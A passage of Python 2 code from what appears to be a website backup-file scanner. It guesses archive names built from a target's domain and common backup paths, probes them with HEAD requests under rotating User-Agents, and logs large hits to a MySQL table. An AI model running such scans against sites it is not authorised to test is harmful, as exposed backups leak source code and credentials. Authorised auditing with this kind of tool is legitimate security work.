                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_0.url), str('备份文件:'+rar_size), str(web_title),str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕
            ######################################
    url_domain_1 = url + '/' + str(url.split('//',2)[1]).replace('.','').replace('/','')
    # http://www.baidu.com/wwwbaiducom
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_1 = requests.head(url=str(url_domain_1 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_1.url) + '  ' + str(r_domain_1.status_code)
            if r_domain_1.status_code == 200:
                try:
                    if int(r_domain_1.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_1.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_1.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕
            ######################################
    url_domain_3 = url + '/' + url.split('.',1)[1].replace('/','')
    # http://www.baidu.com/baidu.com
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_3 = requests.head(url=str(url_domain_3 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_3.url) + '  ' + str(r_domain_3.status_code)
            if r_domain_3.status_code == 200:
                try:
                    if int(r_domain_3.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_3.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_3.url), str('备份文件:'+rar_size), str(web_title),str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕
            ######################################
    url_domain_2 = url + '/' + url.split('.',1)[1].replace('.','').replace('/','')
    # http://www.baidu.com/baiducom
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_2 = requests.head(url=str(url_domain_2 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_2.url) + '  ' + str(r_domain_2.status_code)
            if r_domain_2.status_code == 200:
                try:
                    if int(r_domain_2.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_2.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_2.url), str('备份文件:'+rar_size), str(web_title),str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕
            ######################################
    url_domain_4 = url + '/' + str(url.split(".", 2)[1]) + '2016'
    # http://www.baidu.com/baidu
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_4 = requests.head(url=str(url_domain_4 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_4.url) + '  ' + str(r_domain_4.status_code)
            if r_domain_4.status_code == 200:
                try:
                    if int(r_domain_4.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_4.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_4.url), str('备份文件:'+rar_size), str(web_title),str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕
            ######################################
    url_domain_5 = url + '/' + str(url.split(".", 2)[1]) + '2017'
    # http://www.baidu.com/baidu2017
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_5 = requests.head(url=str(url_domain_5 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_5.url) + '  ' + str(r_domain_5.status_code)
            if r_domain_5.status_code == 200:
                try:
                    if int(r_domain_5.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_5.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_5.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕
            ######################################
    url_domain_5 = url + '/' + str(url.split(".", 2)[1]) + '2018'
    # http://www.baidu.com/baidu2017
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_5 = requests.head(url=str(url_domain_5 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_5.url) + '  ' + str(r_domain_5.status_code)
            if r_domain_5.status_code == 200:
                try:
                    if int(r_domain_5.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_5.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_5.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
    url_domain_5 = url + '/' + url.replace('.com','').replace('.cn','').replace('.org','').replace('.net','').replace('.org','')
    # http://www.baidu.com/baidu2017
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_5 = requests.head(url=str(url_domain_5 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_5.url) + '  ' + str(r_domain_5.status_code)
            if r_domain_5.status_code == 200:
                try:
                    if int(r_domain_5.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_5.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_5.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
    url_domain_8 = url + '/' + str(url.replace('www.',''))
    # http://www.baidu.com/baidu2017
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_8 = requests.head(url=str(url_domain_8 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_8.url) + '  ' + str(r_domain_8.status_code)
            if r_domain_8.status_code == 200:
                try:
                    if int(r_domain_8.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_8.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_8.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
    url_domain_6 = url + '/' + str(url.split(".", 2)[1]) + '2015'
    # http://www.baidu.com/baidu2017
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_6 = requests.head(url=str(url_domain_6 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_6.url) + '  ' + str(r_domain_6.status_code)
            if r_domain_6.status_code == 200:
                try:
                    if int(r_domain_6.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_6.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_6.url), str('备份文件:'+rar_size), str(web_title),str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕
            ######################################
    for back_B in backup_name_B:
        url_rar = url + back_B
        # http://www.baidu.com/root.rar
        #print 'Cheaking>>>' + url_rar
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_rar = requests.head(url=str(url_rar), headers=headers, timeout=5)
            #print r_rar.url + " : " + str(r_rar.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_rar.url) + '  ' + str(r_rar.status_code)
            if r_rar.status_code == 200:
                try:
                    if int(r_rar.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_rar.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf1 = coon_bf1.cursor()
                            sql_bf1 = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf1.execute(sql_bf1, (str(r_rar.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf1.commit()
                            cur_bf1.close()
                            coon_bf1.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                        # 这一行的意思是返回的对象的头部信息中 返回的大小大于2M
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
##################zhaohanloveyou
    url_domain = url + '/data/' + url.split(".", 2)[1]
    # http://www.baidu.com/baidu
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain = requests.head(url=str(url_domain + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain.url) + '  ' + str(r_domain.status_code)
            if r_domain.status_code == 200:
                try:
                    if int(r_domain.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2,6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
    url_domain = url + '/www/' + url.split(".", 2)[1]
    # http://www.baidu.com/baidu
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain = requests.head(url=str(url_domain + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain.url) + '  ' + str(r_domain.status_code)
            if r_domain.status_code == 200:
                try:
                    if int(r_domain.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2,6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
    for back_B in backup_name_B:
        url_rar = url + '/www'+back_B
        # http://www.baidu.com/root.rar
        #print 'Cheaking>>>' + url_rar
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_rar = requests.head(url=str(url_rar), headers=headers, timeout=5)
            #print r_rar.url + " : " + str(r_rar.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_rar.url) + '  ' + str(r_rar.status_code)
            if r_rar.status_code == 200:
                try:
                    if int(r_rar.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_rar.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf1 = coon_bf1.cursor()
                            sql_bf1 = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf1.execute(sql_bf1, (str(r_rar.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf1.commit()
                            cur_bf1.close()
                            coon_bf1.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                        # 这一行的意思是返回的对象的头部信息中 返回的大小大于2M
                    else:
                        pass
                except Exception, e:
                    pass
        except:
            pass
    for back_B in backup_name_B:
        url_rar = url + '/data'+back_B
        # http://www.baidu.com/root.rar
        #print 'Cheaking>>>' + url_rar
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_rar = requests.head(url=str(url_rar), headers=headers, timeout=5)
            #print r_rar.url + " : " + str(r_rar.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_rar.url) + '  ' + str(r_rar.status_code)
            if r_rar.status_code == 200:
                try:
                    if int(r_rar.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_rar.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf1 = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf1 = coon_bf1.cursor()
                            sql_bf1 = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf1.execute(sql_bf1, (str(r_rar.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf1.commit()
                            cur_bf1.close()
                            coon_bf1.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                        # 这一行的意思是返回的对象的头部信息中 返回的大小大于2M
                    else:
                        pass
                except Exception, e:
                    pass
        except:
            pass
    url_domain = url + '/backup/' + url.split(".", 2)[1]
    # http://www.baidu.com/baidu
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain = requests.head(url=str(url_domain + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain.url) + '  ' + str(r_domain.status_code)
            if r_domain.status_code == 200:
                try:
                    if int(r_domain.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2,6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕-+-+-+-+-9
            ######################################
    url_domain_0 = url + '/backup/' + url.split('//',2)[1]
    # http://www.baidu.com/www.baidu.com
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_0 = requests.head(url=str(url_domain_0 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_0.url) + '  ' + str(r_domain_0.status_code)
            if r_domain_0.status_code == 200:
                try:
                    if int(r_domain_0.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_0.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_0.url), str('备份文件:'+rar_size), str(web_title),str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕
            ######################################
    url_domain_1 = url + '/backup/' + str(url.split('//',2)[1]).replace('.','').replace('/','')
    # http://www.baidu.com/wwwbaiducom
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_1 = requests.head(url=str(url_domain_1 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_1.url) + '  ' + str(r_domain_1.status_code)
            if r_domain_1.status_code == 200:
                try:
                    if int(r_domain_1.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_1.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_1.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕
            ######################################
    url_domain_3 = url + '/backup/' + url.split('.',1)[1].replace('/','')
    # http://www.baidu.com/baidu.com
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_3 = requests.head(url=str(url_domain_3 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_3.url) + '  ' + str(r_domain_3.status_code)
            if r_domain_3.status_code == 200:
                try:
                    if int(r_domain_3.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_3.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_3.url), str('备份文件:'+rar_size), str(web_title),str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕
            ######################################
    url_domain_2 = url + '/backup/' + url.split('.',1)[1].replace('.','').replace('/','')
    # http://www.baidu.com/baiducom
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_2 = requests.head(url=str(url_domain_2 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_2.url) + '  ' + str(r_domain_2.status_code)
            if r_domain_2.status_code == 200:
                try:
                    if int(r_domain_2.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_2.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_2.url), str('备份文件:'+rar_size), str(web_title),str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕
            ######################################
    url_domain_4 = url + '/backup/' + str(url.split(".", 2)[1]) + '2016'
    # http://www.baidu.com/baidu
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_4 = requests.head(url=str(url_domain_4 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_4.url) + '  ' + str(r_domain_4.status_code)
            if r_domain_4.status_code == 200:
                try:
                    if int(r_domain_4.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_4.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_4.url), str('备份文件:'+rar_size), str(web_title),str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕
            ######################################
    url_domain_5 = url + '/backup/' + str(url.split(".", 2)[1]) + '2017'
    # http://www.baidu.com/baidu2017
    for back_A in backup_name_A:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_domain_5 = requests.head(url=str(url_domain_5 + back_A), headers=headers, timeout=5)
            #print 'Cheaking>>>' + r_domain.url
            #print r_domain.url + " : " + str(r_domain.status_code)
            print str(threading.current_thread().name) + ' ' + str(r_domain_5.url) + '  ' + str(r_domain_5.status_code)
            if r_domain_5.status_code == 200:
                try:
                    if int(r_domain_5.headers["Content-Length"]) > 2000000:
                        rar_size = str(int(r_domain_5.headers["Content-Length"]) / 1000000) + 'M'
                        try:
                            timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                            coon_bf = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname,charset='utf8')
                            cur_bf = coon_bf.cursor()
                            sql_bf = "INSERT INTO url_backup (url,rarsize,urltitle,datatime) VALUES (%s,%s,%s,%s)"
                            cur_bf.execute(sql_bf, (str(r_domain_5.url), str('备份文件:'+rar_size),str(web_title), str(timenow)))
                            coon_bf.commit()
                            cur_bf.close()
                            coon_bf.close()
                            time.sleep(random.randint(2, 6))
                            return ''
                        except:
                            pass
                    else:
                        pass
                except Exception, e:
                    pass
                    #print e
            else:
                pass
        except Exception, e:
            pass
            #print e
            ######################################
            # 域名加常见后缀组合扫描完毕
            ######################################
